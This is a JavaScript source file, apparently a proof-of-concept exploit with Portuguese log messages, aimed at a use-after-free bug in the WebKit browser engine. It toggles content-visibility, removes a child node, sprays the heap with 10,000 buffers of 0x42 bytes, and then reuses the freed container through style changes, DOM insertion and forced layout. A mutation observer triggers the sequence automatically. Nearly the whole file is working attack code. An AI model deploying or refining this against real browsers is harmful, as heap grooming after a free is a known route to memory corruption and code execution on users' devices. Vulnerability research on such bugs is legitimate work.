// js/uaf_webkit_poc/poc.js
import { debug_log } from './module/utils.mjs';

let uafCoreLogicHasRun = false;

function heapSpray() {
  let spray = [];
  const sprayIterations = 10000; 
  const sprayPatternQWORD = [0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42]; 
  debug_log(`Iniciando heapSpray AGRESSIVO com ${sprayIterations} iterações e padrão QWORD [0x42...]...`);
  for (let i = 0; i < sprayIterations; i++) {
    let arr = new Uint8Array(0x1000);
    for (let j = 0; j < arr.length; j++) {
      arr[j] = sprayPatternQWORD[j % sprayPatternQWORD.length];
    }
    spray.push(arr);
  }
  return spray;
}

export function triggerUAF() {
  const currentContainer = document.querySelector(".container");

  if (!currentContainer) {
    debug_log("Erro Crítico: Elemento .container não encontrado para UAF.");
    return;
  }

  if (uafCoreLogicHasRun && document.getElementById('runUAFBtn') && document.getElementById('runUAFBtn').disabled) {
    debug_log("UAF já foi tentado. Recarregue a página para um novo teste.");
    return;
  }

  const currentChild = currentContainer.querySelector(".child");

  debug_log("Iniciando tentativa de UAF AGRESSIVO: contentVisibility=hidden...");
  currentContainer.style.contentVisibility = "hidden";

  if (currentChild) {
    debug_log("Elemento .child encontrado, removendo-o.");
    currentChild.remove();
  } else {
    debug_log("Elemento .child já foi removido ou não encontrado inicialmente.");
  }

  uafCoreLogicHasRun = true; 
  const uafButton = document.getElementById('runUAFBtn');
  if(uafButton) {
      uafButton.disabled = true;
      debug_log("Botão de UAF desabilitado. Recarregue a página para um novo teste completo.");
  }

  setTimeout(() => {
    debug_log("Continuando UAF AGRESSIVO: contentVisibility=auto, heapSpray()...");
    if (document.body.contains(currentContainer)) {
        currentContainer.style.contentVisibility = "auto";
    } else {
        debug_log("Container foi removido do DOM antes de contentVisibility='auto'.");
        return;
    }
    
    let sprayArrays = heapSpray(); 
    if(sprayArrays.length > 0) {
        debug_log(`Heap spray AGRESSIVO realizado com ${sprayArrays.length} arrays (padrão QWORD [0x42...]).`);
    }
    debug_log("Tentativa de UAF AGRESSIVO (principal) concluída.");

    // Manipulações de DOM ADICIONAIS E AGRESSIVAS após o UAF - AGORA COM LOGS DETALHADOS
    if (document.body.contains(currentContainer)) {
        debug_log("Iniciando interações adicionais AGRESSIVAS no container pós-UAF...");
        try {
            debug_log("Tentativa 1: Mudar backgroundColor e forçar offsetHeight...");
            currentContainer.style.backgroundColor = "#FF0000";
            void currentContainer.offsetHeight; 
            debug_log("Sucesso: backgroundColor e offsetHeight.");

            debug_log("Tentativa 2: Adicionar e remover tempChild com offsetHeight...");
            let tempChild = document.createElement('div');
            tempChild.style.width = "50px";
            tempChild.style.height = "50px";
            tempChild.style.background = "lime";
            tempChild.textContent = "New";
            currentContainer.appendChild(tempChild);
            void currentContainer.offsetHeight; 
            currentContainer.removeChild(tempChild);
            void currentContainer.offsetHeight;
            debug_log("Sucesso: tempChild adicionado/removido e offsetHeight.");

            debug_log("Tentativa 3: Modificar innerHTML e forçar offsetHeight...");
            currentContainer.innerHTML += "<span>Texto Adicionado Pós-UAF</span>";
            void currentContainer.offsetHeight; 
            debug_log("Sucesso: innerHTML modificado e offsetHeight.");

            debug_log("Tentativa 4: Aplicar transform scale e forçar offsetHeight...");
            currentContainer.style.transform = "scale(1.1)";
            void currentContainer.offsetHeight; 
            currentContainer.style.transform = "scale(1.0)";
            void currentContainer.offsetHeight;
            debug_log("Sucesso: transform scale e offsetHeight.");

            debug_log("TODAS as interações adicionais AGRESSIVAS no container concluídas SEM ERRO JAVASCRIPT.");
        } catch(e) {
            // Este catch pegaria erros de JavaScript, mas não um congelamento do motor de renderização.
            debug_log(`ERRO JAVASCRIPT durante interações agressivas no DOM: ${e.name} - ${e.message}`);
            console.error("Erro DOM agressivo:", e);
        }
    } else {
        debug_log("Container não está mais no DOM para interações agressivas.");
    }
  }, 0); // setTimeout
}

// Configuração do MutationObserver (continua one-shot para a lógica principal)
const initialContainerForObserver = document.querySelector(".container");
if (initialContainerForObserver) {
    const observer = new MutationObserver((mutationsList, obs) => {
      if (!uafCoreLogicHasRun) { 
        debug_log("MutationObserver: DOM tree modified, chamando triggerUAF (primeira vez via observer)...");
        triggerUAF();
        obs.disconnect(); 
        debug_log("MutationObserver desconectado.");
      } else {
        obs.disconnect(); 
      }
    });
    observer.observe(initialContainerForObserver, { childList: true, subtree: true });
} else {
    console.warn("Elemento .container inicial não encontrado para MutationObserver no UAF PoC.");
}
